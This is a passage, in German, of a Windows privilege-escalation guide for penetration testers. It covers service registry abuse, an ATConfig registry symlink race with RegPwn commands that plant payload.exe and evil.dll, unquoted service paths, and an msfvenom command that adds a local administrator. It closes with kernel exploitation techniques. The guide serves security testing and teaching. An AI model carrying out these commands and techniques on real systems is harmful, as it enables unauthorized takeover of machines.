4. Starten Sie den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warten Sie auf einen Neustart / Dienstauslöser).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst es einem normalen Benutzer nicht erlaubt, ihn neu zu starten, prüfen Sie, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt durch die Anwendung ausgelöst werden kann, die ihn verwendet.

### Berechtigungen zum Ändern der Dienstregistrierung

Sie sollten prüfen, ob Sie eine Dienstregistrierung ändern können.\
Sie können Ihre **Berechtigungen** für eine **Dienstregistrierung** **prüfen**, indem Sie:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Prüfen Sie, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibrechte auf einen bestimmten Serviceschlüssel in der Registry verfügen. Ein ACL-Eintrag allein belegt keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen spielen ebenfalls eine Rolle. Die Rechte für Registry-Schlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Serviceobjekt. Für eine Privilegieneskalation sind außerdem ein nutzbares Konfigurationsfeld des Service, eine Möglichkeit, den Service auszulösen, und eine privilegiertere Serviceidentität erforderlich. Siehe Microsofts [Rechte für Registry-Schlüssel](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Referenz zu Servicezugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So ändern Sie den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Werteschreibvorgänge (ATConfig)

Einige Windows-Barrierefreiheitsfeatures erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symbolic-Link-Race** kann diesen privilegierten Schreibvorgang auf einen **beliebigen HKLM-Pfad** umleiten und so einen Mechanismus für beliebige HKLM-**Werteschreibvorgänge** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfeatures auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung und beim Wechsel zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren auf den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race**: Setze ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; wenn das oplock ausgelöst wird, ersetze den **HKLM Session ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du zur LPE übergehen, indem du Dienstkonfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt während der Race die Workstation**.

Beispieltools (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen für Services-Registry-Schlüssel

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie darunter Unterschlüssel erstellen können**. Bei Windows-Services reicht das aus, um **beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Pfadabschnitt vor einem Leerzeichen auszuführen.

Für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle unquoted service paths auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Du kannst** diese Schwachstelle mit metasploit **erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path` Mit metasploit kannst du manuell eine Dienst-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Privilege Escalation möglich. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skriptziele geplanter Aufgaben

Prüfe bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das in den **Aktionsargumenten** genannte Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfe auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachvollzogen werden. Ein Skript oder übergeordnetes Verzeichnis, das vom aufrufenden Benutzer beschrieben werden kann, ist nur dann ein Hinweis auf kontoübergreifende Ausführung, wenn sich der konfigurierte Aufgabenprinzipal vom aufrufenden Benutzer unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripten relevant sein; ein früheres `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Prüfe die effektiven ACLs, den [Aufgabenausführungskontext](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor du eine Privilege Escalation behauptest. Die Bestandsaufnahme sollte weder das Skript ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfe bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor du Inhalte öffnest. Windows stellt sie über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Hinweis. Prüfe den effektiven Lesezugriff auf die Datei, die Unterstützung von Streams durch das Dateisystem, ob der Stream verwendbare Zugangsdaten enthält und für welches Konto diese tatsächlich gelten. Vermeide rekursive Stream-Scans und die Ausgabe von Stream-Inhalten bei routinemäßigen Aufzählungen.

## Eingaben des geplanten Windows Driver Kit-Hilfsprogramms

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das aus seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verwenden kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit niedrigen Berechtigungen auf diese Eingaben in Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Prüfe, ob ein privilegierter Prozess die Dateien verwendet und ob **beide** Begleitdateien erstellt oder geändert werden können; das Hilfsprogramm allein zu finden, reicht nicht aus.

Prüfe bei einer geplanten Aufgabe deren [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) und die ACLs der beiden Begleitdateipfade. Wenn die Aufgabe kein Arbeitsverzeichnis angibt, ist das Verzeichnis der ausführbaren Datei lediglich ein Hinweis, der überprüft werden muss, kein Beweis dafür, wo die Aufgabe ihre Eingaben liest. Auch die Voraussetzung für die Projektarbeitsdatei muss erfüllt sein. Prüfe den tatsächlichen Aufgabenprinzipal, statt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfe die **Berechtigungen der Binärdateien** (vielleicht kannst du eine davon überschreiben und eine Privilege Escalation erreichen) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Windows-Agent-Reparaturpfad

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und anschließend eine bereits vorhandene, schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Anbieter behob das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1. Prüfen Sie den vollständigen installierten Patchlevel und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine reine Branch-Angabe wie `2.1` kann keine Anfälligkeit belegen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und frühere Versionen; der Anbieter behob das Problem in Build 6211. Relevant ist die Schwachstelle nur, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für ein installiertes Produkt oder ein Dienstpfad ist daher ein Hinweis, aber kein Schwachstellenurteil: Bestätigen Sie den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerkerreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt eine Instanz voraus, die als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, kein Beleg für verwendbare Zugangsdaten oder diese SAML-Schwachstelle. Erfassen Sie Pfad und Zugriffsrechte, ohne die Datei bei der routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; bestätigen Sie jedoch, dass er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents, und gespeicherte Zugangsdaten sind nur verwendbar, wenn der Job auf deren Geltungsbereich zugreifen kann. Prüfen Sie außerdem den Zugriff auf Metadaten in `JENKINS_HOME`: Jenkins speichert Zugangsdaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr Vorhandensein allein legt kein Passwort offen; überprüfen Sie **den Lesezugriff auf die erforderlichen Dateien** sowie einen separaten Weg zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzter Ausgabe auszugeben. Wenn dieses Konto über ein Schreibrecht auf `scriptPath` des AD-Benutzerobjekts verfügt, bestätigen Sie einen beschreibbaren Skriptpfad sowie einen tatsächlich vorhandenen Anmelde- oder Zeitplanprozess, der als Zielbenutzer ausgeführt wird, bevor Sie dies als kontenübergreifende Ausführung einstufen. Weitere Gruppensteuerungsmöglichkeiten erfordern separat verifizierte effektive AD-Rechte.

#### Identität eines selbstgehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, der Berechtigung, sie **in die Warteschlange zu stellen**, und der Berechtigung, den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt übermitteln und diese Pipeline auf einem selbstgehosteten Windows-Agent ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Überprüfen Sie die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen Wechsel zu einem anderen Benutzer oder SYSTEM behaupten. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind allein nur Hinweise; prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Microsoft-Entra-Connect-Sync-Zugangsdaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Zugangsdaten des Connectors werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe mit vermeintlichen lokalen Administratorrechten oder alleiniger Datenbankzugriff belegen weder entschlüsselbare Zugangsdaten noch eine Rechteausweitung in der Domäne. Prüfen Sie separat die tatsächlichen Leserechte für die Datenbank, den Zugriff auf Dienstkonto und Schlüssel, die Installations- und SQL-Struktur, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen. Die routinemäßige Enumeration sollte nur Dienst- und Zugriffsmetadaten anzeigen, nicht die gespeicherten Geheimnisse abfragen oder ausgeben.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` ablegen und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs einschließlich übergeordneter Verzeichnisse und Reparse Points, selbst wenn die WMI-Auflistung von Druckern verweigert wird. Für das [Druckertreiberproblem von Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine schreibbare ACL ist lediglich ein Hinweis: Verifizieren Sie den effektiven Schreibzugriff nach Berücksichtigung verweigernder Einträge, dass der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt sowie ob ein aktualisierter Treiber oder ein Sicherheitsprogramm des Anbieters die Installation behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine bestimmte Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/-Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable Installation/Kopie vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (auch über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registrierungsschlüssel oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Treibern von Drittanbietern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine primitive Funktion für beliebige Kernel-Lese-/Schreibzugriffe bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Privilegien erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann eine absichtliche Verlangsamung der Suche (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnisketten) das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAFs in Cancel-safe queues, Offenlegung von paged-pool-Daten und I/O-ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei jeweils wenig schwerwiegenden Bugs aufbauen: einer **Race Condition bei der Lebensdauer einer cancel-safe queue**, die eine Anforderung/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene paged-pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Ausnutzung:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgspfad mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruchpfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgspfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor die CBDQ/CSQ-Sperre freigegeben wird, kann ein Thread, der in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockiert ist, später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Reclaim das freigegebene Queue-Objekt** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries sind nützlich, da Payload und Größe kontrollierbar sind und sie später mit Pipe-Lese-/Peek-Operationen geprüft werden können. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listenkopf anzuhalten.
- **Eine vorhersagbare Schreiboperation aufwerten**: Wenn der gefälschte Request einen verschachtelten Kontextzeiger umleitet, der für Bookkeeping-Schreibvorgänge verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen Kernel-Schreibzugriff mit **kontrollierbarer Adresse, aber nicht kontrollierbarem Wert**. Ziele in diesem Fall auf das **Längen-/Größenfeld** eines gesprayten Pool-Objekts statt auf einen abschließenden Code-/Datenzeiger und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Lesezugriff auf den paged pool** ermöglicht.
- **Muster für racebare Offenlegung**: Jeder Systemaufruf mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein vielversprechender Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (beispielsweise durch das Hinzufügen vieler Listen-/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen), da der längere Kopiervorgang das Ersetzungsfenster erweitert, ohne zwangsläufig einen Systemabsturz zu verursachen.
- **Ziele für das Auffüllen mit vielen Zeigern**: Registrierte Buffer-Arrays des Windows-**I/O ring** sind hervorragende Ziele für die Offenlegung, da ihre paged-pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Lege eines dieser Arrays offen, ermittle das umgebende `IORING_OBJECT` und beschädige dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Lese-/Schreibzugriffe ermöglichen. Wenn der einzige verfügbare Schreibzugriff ein stabiles Byte liefert (beispielsweise aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibzugriffe**, um einen User-Zeiger mit wiederholten Bytes wie `0x0101010101010101` aufzubauen, ordne ihn mit `VirtualAlloc` zu und platziere das gefälschte Array registrierter Buffer dort.<sup>[[30]](#references)</sup>

Nützliche Hinweise beim Debuggen:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du mit dem beschädigten I/O ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehl mit dem üblichen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherbeschädigung von Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts vorzubereiten, beschreibbare HKLM-/HKU-Unterpfade auszunutzen und Metadatenbeschädigungen ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-Typverwechslung im Direct-Modus durch vom Angreifer kontrollierte Pfade

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` in eine skalare Stack-Variable wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert und nicht anhand des vom Entwickler erwarteten Typs.

Daraus ergeben sich zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / Oracle**: Ein vom Angreifer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer gewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Logs offenzulegen und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder größenabhängiger Binärpuffer typverwechselt.

Praktische Hinweise zur Ausnutzung:

- **Mitigation unter Windows 8 und höher**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` bereitzustellen.
- **Bereitstellung in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Unterpfade von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity-**Token erneut aus, um Schlüssel zu finden, die aus sandboxed Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direkten Modus muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zunächst ein angreifergesteuertes `REG_DWORD` in einen skalaren Stack-Wert und verwendet denselben Puffer anschließend erneut zum Lesen eines Strings, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Zeiger teilweise. Das ermöglicht einen teilweise kontrollierten Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direkte Modus den ersten `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen **negativen**, angreifergesteuerten Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Das ist oft der sauberste Weg, einen Callback-Zeiger vollständig zu überschreiben.

